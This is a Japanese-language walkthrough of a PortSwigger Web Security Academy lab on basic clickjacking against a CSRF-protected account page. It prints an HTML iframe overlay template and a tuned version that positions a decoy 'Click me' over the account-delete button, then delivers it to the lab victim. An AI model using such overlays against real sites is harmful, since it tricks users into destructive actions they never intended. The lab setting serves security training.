# CSRF トークン保護を使用した基本的なクリックジャッキング

次のハッキングラボを実施します  
https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected  
このラボには、 CSRF トークン で保護されたログイン機能とアカウント削除ボタンが含まれています。ユーザーは、おとり Web サイトで「クリック」という単語が表示される要素をクリックします。

- 1. 一般ユーザーでログインします
- 2. エクスプロイト サーバーに移動し、次の HTML テンプレートを Body セクションに貼り付けます。

```html
<style>
  iframe {
    position: relative;
    width: $width_value;
    height: $height_value;
    opacity: $opacity;
    z-index: 2;
  }
  div {
    position: absolute;
    top: $top_value;
    left: $side_value;
    z-index: 1;
  }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

- 3. クリックジャッキングの位置をアカウント削除ボタンに合うように調整します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/caa9145d-53d5-4ca0-a8b1-300c03cd9c87)

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 700px;
    opacity: 0.5;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 550px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="https://0ae1001f03856ff282a829e7004f0035.web-security-academy.net/my-account"></iframe>
```

- 4. Store ボタンを押して、deliver exploit to victim ボタンを押します。
